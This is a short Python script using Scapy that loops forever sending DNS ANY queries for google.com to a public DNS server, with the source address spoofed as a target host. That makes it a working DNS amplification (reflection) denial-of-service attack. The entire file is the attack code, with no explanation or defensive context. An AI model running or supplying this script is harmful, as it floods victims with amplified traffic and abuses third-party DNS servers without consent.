# Python Script

from scapy.all import *

while True:

    target = "10.0.2.15" # Target host
    nameserver = "103.57.211.24" # DNS server

    ip = IP (src = target, dst = nameserver)
    udp = UDP (dport = 53)
    dns = DNS (rd = 1, qdcount = 1, qd = DNSQR (qname = "google.com", qtype = 255))

    request = (ip/udp/dns)

    send (request)